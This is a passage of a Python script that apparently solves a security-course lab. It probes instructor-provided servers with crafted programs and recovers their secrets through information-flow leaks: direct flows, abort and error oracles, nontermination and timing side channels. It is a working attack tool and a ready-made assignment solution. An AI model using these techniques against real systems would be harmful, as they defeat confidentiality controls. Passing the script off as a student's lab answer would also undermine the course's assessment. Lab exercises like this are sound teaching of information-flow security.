                    while lo_m + 1 < hi_m:
                        mid_m = (lo_m + hi_m) // 2
                        if mapped_classify(mid_m) == right_val:
                            hi_m = mid_m
                        else:
                            lo_m = mid_m
                    candidate = mapped_to_secret_guess(lo_m)

                    verify_passes = 0
                    verified_value: Optional[int] = None
                    for _ in range(5):
                        verified = verify_nearby_candidates(
                            server_command=server_command,
                            userid=userid,
                            candidate=candidate,
                            timeout_s=verify_timeout_s,
                        )
                        if verified is not None:
                            verify_passes += 1
                            verified_value = verified
                    if verify_passes >= 3 and verified_value is not None:
                        if verified_value != candidate:
                            debug_log(
                                debug,
                                f"[timing] adjusted candidate {candidate} -> {verified_value}",
                            )
                        return verified_value
                    debug_log(
                        debug,
                        f"[timing] {candidate_name}: local-bracket candidate failed verification "
                        f"({verify_passes}/5)",
                    )

            if conf_lo < min_boundary_consistency or conf_hi < min_boundary_consistency:
                last_failure = (
                    "timing boundary too noisy "
                    f"for {candidate_name} (conf_lo={conf_lo:.2f}, conf_hi={conf_hi:.2f})"
                )
                debug_log(debug, f"[timing] {last_failure}")
                continue
            if boundary_lo == boundary_hi:
                last_failure = (
                    "timing boundary check failed "
                    f"for {candidate_name} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi}, "
                    f"conf_lo={conf_lo:.2f}, conf_hi={conf_hi:.2f})"
                )
                debug_log(debug, f"[timing] {last_failure}")
                continue

            if (not boundary_lo) and boundary_hi:
                candidate = binary_search_oracle(classify)
            else:
                candidate = binary_search_oracle(lambda mid: not classify(mid))

            # Timing candidates are noisy; confirm before returning so we can
            # continue trying other timing templates if this one is a false positive.
            verify_passes = 0
            verified_value: Optional[int] = None
            for _ in range(5):
                verified = verify_nearby_candidates(
                    server_command=server_command,
                    userid=userid,
                    candidate=candidate,
                    timeout_s=verify_timeout_s,
                )
                if verified is not None:
                    verify_passes += 1
                    verified_value = verified
            if verify_passes >= 3 and verified_value is not None:
                if verified_value != candidate:
                    debug_log(
                        debug,
                        f"[timing] adjusted candidate {candidate} -> {verified_value}",
                    )
                return verified_value

            last_failure = (
                f"timing candidate from {candidate_name} failed verification "
                f"({verify_passes}/5)"
            )
            debug_log(debug, f"[timing] {last_failure}")
            continue

    raise StrategyFailed(last_failure)


def attempt_strategy(
    *,
    server_idx: int,
    name: str,
    func: Callable[[], int],
    debug: bool,
) -> Optional[int]:
    log(f"[serve{server_idx}] trying {name}")
    try:
        return func()
    except StrategyFailed as e:
        debug_log(debug, f"[serve{server_idx}] {name} unavailable: {e}")
        return None


def recover_server_secret(
    *,
    server_idx: int,
    userid: str,
    timeout_s: float,
    timing_timeout_s: float,
    timing_repeats: int,
    debug: bool,
) -> Optional[int]:
    server_command = f"~mfredrik/bin/c0_serve{server_idx}"
    tuned_query_timeout = estimate_timeout(
        server_command=server_command,
        userid=userid,
        base_timeout_s=timeout_s,
        debug=debug,
    )
    tuned_timing_timeout = max(timing_timeout_s, tuned_query_timeout * 2.0)
    debug_log(
        debug,
        f"[serve{server_idx}] using query-timeout={tuned_query_timeout:.2f}s "
        f"timing-timeout={tuned_timing_timeout:.2f}s",
    )
    def probe_kind(program_source: str, *, input_value: int = 0) -> str:
        with ProgramFile(program_source) as path:
            res = run_query(
                server_command=server_command,
                userid=userid,
                program_path=path,
                input_value=input_value,
                timeout_s=tuned_query_timeout,
            )
        return res.kind

    direct_kind = probe_kind(DIRECT_FLOW_PROGRAM, input_value=0)
    implicit_kind = probe_kind(IMPLICIT_BOOLEAN_PROGRAM, input_value=0)
    abort_kind = probe_kind(ABORT_ERROR_ORACLE_PROGRAM, input_value=0)
    expr_and_kind = probe_kind(EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM, input_value=0)

    strict_policy_mode = (
        direct_kind == "insecure"
        and implicit_kind == "insecure"
        and abort_kind == "insecure"
    )
    if debug:
        debug_log(
            True,
            f"[serve{server_idx}] fingerprint direct={direct_kind} implicit={implicit_kind} "
            f"abort={abort_kind} expr-and={expr_and_kind}",
        )
        if strict_policy_mode:
            debug_log(
                True,
                f"[serve{server_idx}] strict-policy mode enabled (most classic channels rejected as insecure)",
            )

    full_strategies: list[tuple[str, Callable[[], int]]] = [
        (
            "direct explicit flow",
            lambda: recover_direct(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
            ),
        ),
        (
            "direct flow with explicit L label",
            lambda: recover_direct_template(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=DIRECT_LABEL_DOWNGRADE_PROGRAM,
                strategy_name="direct flow explicit L",
            ),
        ),
        (
            "direct flow via high temporary",
            lambda: recover_direct_template(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=DIRECT_HIGH_TEMP_PROGRAM,
                strategy_name="direct flow high temp",
            ),
        ),
        (
            "direct flow via high array",
            lambda: recover_direct_template(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=DIRECT_ARRAY_HIGH_PROGRAM,
                strategy_name="direct flow high array",
            ),
        ),
        (
            "direct flow via low array",
            lambda: recover_direct_template(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=DIRECT_ARRAY_LOW_PROGRAM,
                strategy_name="direct flow low array",
            ),
        ),
        (
            "implicit-flow boolean oracle",
            lambda: recover_from_failure_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=IMPLICIT_BOOLEAN_PROGRAM,
            ),
        ),
        (
            "comparison-as-int oracle",
            lambda: recover_from_failure_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=COMPARE_AS_INT_ORACLE_PROGRAM,
            ),
        ),
        (
            "comparison-as-int tmp oracle",
            lambda: recover_from_failure_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=COMPARE_AS_INT_TMP_ORACLE_PROGRAM,
            ),
        ),
        (
            "bitwise abort oracle",
            lambda: recover_from_bitwise_abort_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
            ),
        ),
        (
            "bitwise expr abort oracle (and-guard)",
            lambda: recover_from_bitwise_expr_abort_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                mode="and",
            ),
        ),
        (
            "bitwise expr abort oracle (or-guard)",
            lambda: recover_from_bitwise_expr_abort_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                mode="or",
            ),
        ),
        (
            "expr abort oracle (int-cast div)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_INTCAST_DIV_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "expr abort oracle (int-cast mod)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_INTCAST_MOD_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "expr abort oracle (int-cast div rev)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_INTCAST_DIV_REV_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "expr abort oracle (&& div0)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "expr abort oracle (&& mod0)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "expr abort oracle (&& oob)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=EXPR_ABORT_AND_OOB_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (error)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_ERROR_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (assert)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_ASSERT_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (divide by zero)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_DIVZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (mod by zero)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_MODZERO_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "abort oracle (oob read)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=ABORT_OOB_ORACLE_PROGRAM,
                true_kinds={"abort"},
                false_kinds={"failure"},
            ),
        ),
        (
            "nontermination oracle",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=TERMINATION_ORACLE_PROGRAM,
                true_kinds={"timeout"},
                false_kinds={"failure"},
            ),
        ),
        (
            "nontermination oracle (alt loop)",
            lambda: recover_from_kind_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                program_source=TERMINATION_ORACLE_ALT_PROGRAM,
                true_kinds={"timeout"},
                false_kinds={"failure"},
            ),
        ),
        (
            "timing oracle",
            lambda: recover_from_timing_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_timing_timeout,
                repeats=timing_repeats,
                debug=debug,
                verify_timeout_s=tuned_query_timeout,
            ),
        ),
    ]
    strict_mode_strategies: list[tuple[str, Callable[[], int]]] = [
        (
            "strict expr-abort suite",
            lambda: recover_from_strict_expr_abort_suite(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
            ),
        ),
        (
            "strict expr fuzz suite",
            lambda: recover_from_strict_expr_fuzz_suite(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_query_timeout,
                debug=debug,
                max_probes=220,
            ),
        ),
        (
            "timing oracle",
            lambda: recover_from_timing_oracle(
                server_command=server_command,
                userid=userid,
                timeout_s=tuned_timing_timeout,
                repeats=timing_repeats,
                debug=debug,
                verify_timeout_s=tuned_query_timeout,
            ),
        ),
    ]
    strategies = strict_mode_strategies if strict_policy_mode else full_strategies

    for strategy_name, strategy_fn in strategies:
        secret = attempt_strategy(
            server_idx=server_idx,
            name=strategy_name,
            func=strategy_fn,
            debug=debug,
        )
        if secret is not None:
            verify_passes = 0
            verified_value: Optional[int] = None
            verified = verify_nearby_candidates(
                server_command=server_command,
                userid=userid,
                candidate=secret,
                timeout_s=tuned_query_timeout,
            )
            if verified is not None:
                verify_passes = 1
                verified_value = verified
            if verified_value is not None:
                verified = verified_value
                if verified != secret:
                    debug_log(
                        debug,
                        f"[serve{server_idx}] adjusted candidate {secret} -> {verified}",
                    )
                return verified
            debug_log(
                debug,
                f"[serve{server_idx}] candidate {secret} from {strategy_name} failed verification "
                f"({verify_passes}/1)",
            )
    if strict_policy_mode:
        log(
            f"[serve{server_idx}] summary: strict-policy fingerprint; remaining channels "
            "appear rejected or too noisy to verify"
        )
    return None


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Lab 2 Part 1 secret extractor")
    p.add_argument("--userid", required=True, help="Andrew user id")
    p.add_argument(
        "--servers",
        nargs="+",
        type=int,
        default=[1, 2, 3, 4, 5],
        help="Server indices to attack (default: 1 2 3 4 5)",
    )
    p.add_argument(
        "--outdir",
        default=".",
        help="Directory where flow_serve<n>.txt files are written",
    )
    p.add_argument(
        "--query-timeout",
        type=float,
        default=1.2,
        help="Timeout for non-timing strategies in seconds",
    )
    p.add_argument(
        "--timing-timeout",
        type=float,
        default=12.0,
        help="Timeout for timing strategy measurements in seconds",
    )
    p.add_argument(
        "--timing-repeats",
        type=int,
        default=3,
        help="Repetitions per timing measurement (median is used)",
    )
    p.add_argument(
        "--debug",
        action="store_true",
        help="Print detailed strategy failure diagnostics",
    )
    return p.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    unresolved: list[int] = []

    for idx in args.servers:
        if idx < 1 or idx > 5:
            log(f"[serve{idx}] skipped: invalid server index")
            unresolved.append(idx)
            continue
        secret = recover_server_secret(
            server_idx=idx,
            userid=args.userid,
            timeout_s=args.query_timeout,
            timing_timeout_s=args.timing_timeout,
            timing_repeats=args.timing_repeats,
            debug=args.debug,
        )
        if secret is None:
            log(f"[serve{idx}] not recovered")
            unresolved.append(idx)
            continue
        outfile = outdir / f"flow_serve{idx}.txt"
        outfile.write_text(f"{secret}\n", encoding="utf-8")
        log(f"[serve{idx}] recovered {secret} -> {outfile}")

    if unresolved:
        log(
            "Unresolved servers: "
            + ", ".join(str(i) for i in unresolved)
            + ". One server may be intentionally secure, or timing may need tuning."
        )
        return 2
    log("All requested servers recovered.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
